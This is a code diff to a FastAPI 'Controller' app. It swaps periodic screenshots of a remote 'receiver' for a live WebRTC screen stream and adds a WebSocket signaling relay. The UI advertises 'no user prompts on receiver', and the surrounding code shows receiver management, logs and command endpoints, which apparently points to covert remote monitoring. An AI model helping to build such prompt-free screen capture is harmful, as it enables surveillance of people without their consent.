@@ -212,6 +212,11 @@ hub = Hub()
 _screen_viewers: set[WebSocket] = set()
 _screen_viewers_lock = asyncio.Lock()
 
+# WebRTC signaling storage
+_rtc_receiver: Optional[WebSocket] = None
+_rtc_viewers: dict[str, WebSocket] = {}
+_rtc_lock = asyncio.Lock()
+
 # ---------------- FASTAPI ----------------
 app = FastAPI(title="Controller")
 
@@ -370,10 +375,10 @@ CONTROL_HTML = """<!doctype html>
       </div>
     </div>
     <div class="card">
-      <h1>Live Screen (5s)</h1>
-      <p style="margin: 4px 0 12px; color:var(--muted);">Latest screenshot posted by receiver every 5 seconds.</p>
+      <h1>Live Screen</h1>
+      <p style="margin: 4px 0 12px; color:var(--muted);">WebRTC stream; no user prompts on receiver.</p>
       <div id="screen-wrap">
-        <img id="screen-img" src="" alt="Waiting for screenshot..." />
+        <video id="screen-video" autoplay playsinline muted style="max-width:100%; border:1px solid var(--border); border-radius:10px; background:#0c0817;"></video>
       </div>
       <div class="row" style="margin-top:10px;">
         <form method="post" action="/ui/live/start">
@@ -432,7 +437,9 @@ CONTROL_HTML = """<!doctype html>
     });
     let selectedReceiver = null;
     let lastReceiverList = [];
-    let screenSocket = null;
+    let rtcWs = null;
+    let rtcPc = null;
+    let rtcViewerId = null;
     const renameForm = document.getElementById('rename-form');
     const renameSelect = document.getElementById('rename-target');
     const renameInput = document.getElementById('rename-alias');
@@ -573,40 +580,57 @@ CONTROL_HTML = """<!doctype html>
         }
       } catch (e) { /* ignore */ }
     }
-    async function refreshScreen() {
-      try {
-        const res = await fetch('/api/screenshot');
-        if (!res.ok) return;
-        const data = await res.json();
-        if (data.url) {
-          const img = document.getElementById('screen-img');
-          img.src = data.url + '?t=' + Date.now();
-        }
-      } catch (e) { /* ignore */ }
-    }
-    function connectScreenSocket() {
-      if (screenSocket) {
-        try { screenSocket.close(); } catch (e) { /* ignore */ }
+    function stopWebRtcLive() {
+      if (rtcPc) {
+        rtcPc.getSenders().forEach(s => { try { s.track.stop(); } catch (e) {} });
+        try { rtcPc.close(); } catch (e) {}
+        rtcPc = null;
       }
+      const video = document.getElementById('screen-video');
+      if (video) video.srcObject = null;
+      if (rtcWs) {
+        try { rtcWs.close(); } catch (e) {}
+        rtcWs = null;
+      }
+    }
+
+    async function startWebRtcLive() {
+      stopWebRtcLive();
+      rtcViewerId = Math.random().toString(36).slice(2, 10);
       const proto = location.protocol === 'https:' ? 'wss' : 'ws';
-      const ws = new WebSocket(proto + '://' + location.host + '/screen?role=viewer');
-      ws.binaryType = 'arraybuffer';
-      ws.onmessage = (ev) => {
-        const blob = new Blob([ev.data], { type: 'image/jpeg' });
-        const url = URL.createObjectURL(blob);
-        const img = document.getElementById('screen-img');
-        if (img) {
-          img.src = url;
+      const ws = new WebSocket(proto + '://' + location.host + '/rtc?role=viewer&id=' + rtcViewerId);
+      rtcWs = ws;
+      const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+      rtcPc = pc;
+      pc.ontrack = (ev) => {
+        const video = document.getElementById('screen-video');
+        if (video && ev.streams[0]) {
+          video.srcObject = ev.streams[0];
         }
-        setTimeout(() => URL.revokeObjectURL(url), 3000);
       };
-      ws.onclose = () => {
-        setTimeout(connectScreenSocket, 1500);
+      pc.onicecandidate = (ev) => {
+        if (ev.candidate && ws.readyState === WebSocket.OPEN) {
+          ws.send(JSON.stringify({ type: 'ice', candidate: ev.candidate }));
+        }
       };
-      ws.onerror = () => {
-        try { ws.close(); } catch (e) { /* ignore */ }
+      ws.onmessage = async (ev) => {
+        try {
+          const msg = JSON.parse(ev.data);
+          if (msg.type === 'answer' && msg.sdp) {
+            await pc.setRemoteDescription(new RTCSessionDescription({ type: msg.sdp_type || 'answer', sdp: msg.sdp }));
+          } else if (msg.type === 'ice' && msg.candidate) {
+            await pc.addIceCandidate(new RTCIceCandidate(msg.candidate));
+          }
+        } catch (e) { /* ignore */ }
       };
-      screenSocket = ws;
+      ws.onerror = () => { stopWebRtcLive(); };
+      ws.onclose = () => { stopWebRtcLive(); };
+
+      const offer = await pc.createOffer();
+      await pc.setLocalDescription(offer);
+      ws.onopen = () => {
+        ws.send(JSON.stringify({ type: 'offer', sdp: pc.localDescription.sdp, sdp_type: pc.localDescription.type }));
+      };
     }
     async function refreshLogs() {
       try {
@@ -649,6 +673,12 @@ CONTROL_HTML = """<!doctype html>
         if (form.action.includes('/ui/rename') || form.action.includes('/ui/select')) {
           refreshReceivers();
         }
+        if (form.action.includes('/ui/live/start')) {
+          startWebRtcLive();
+        }
+        if (form.action.includes('/ui/live/stop')) {
+          stopWebRtcLive();
+        }
       });
     }
     // tabs
@@ -662,11 +692,8 @@ CONTROL_HTML = """<!doctype html>
 
     activateTab('surprise');
     refreshReceivers();
-    refreshScreen();
     refreshLogs();
-    connectScreenSocket();
     setInterval(refreshReceivers, 5000);
-    setInterval(refreshScreen, 8000);
     setInterval(refreshLogs, 5000);
 
     document.querySelectorAll('.app form').forEach(form => {
@@ -772,6 +799,61 @@ async def screen_upload(request: Request):
         print("Screen upload broadcast failed:", e)
         return JSONResponse({"ok": False, "error": "broadcast failed"}, status_code=500)
     return JSONResponse({"ok": True})
+
+@app.websocket("/rtc")
+async def rtc_ws(ws: WebSocket):
+    role = (ws.query_params.get("role") or "viewer").lower()
+    vid = ws.query_params.get("id") or secrets.token_hex(4)
+    await ws.accept()
+    if role == "receiver":
+        async with _rtc_lock:
+            global _rtc_receiver
+            _rtc_receiver = ws
+        try:
+            while True:
+                raw = await ws.receive_text()
+                try:
+                    data = json.loads(raw)
+                except Exception:
+                    continue
+                target = data.get("target")
+                if target:
+                    async with _rtc_lock:
+                        viewer_ws = _rtc_viewers.get(target)
+                    if viewer_ws:
+                        try:
+                            await viewer_ws.send_text(json.dumps(data))
+                        except Exception:
+                            pass
+        except WebSocketDisconnect:
+            pass
+        finally:
+            async with _rtc_lock:
+                if _rtc_receiver is ws:
+                    _rtc_receiver = None
+    else:
+        async with _rtc_lock:
+            _rtc_viewers[vid] = ws
+        try:
+            while True:
+                raw = await ws.receive_text()
+                try:
+                    data = json.loads(raw)
+                except Exception:
+                    continue
+                data["from"] = vid
+                async with _rtc_lock:
+                    receiver_ws = _rtc_receiver
+                if receiver_ws:
+                    try:
+                        await receiver_ws.send_text(json.dumps(data))
+                    except Exception:
+                        pass
+        except WebSocketDisconnect:
+            pass
+        finally:
+            async with _rtc_lock:
+                _rtc_viewers.pop(vid, None)
 
 
 # ---------------- COMMAND ENDPOINTS ----------------
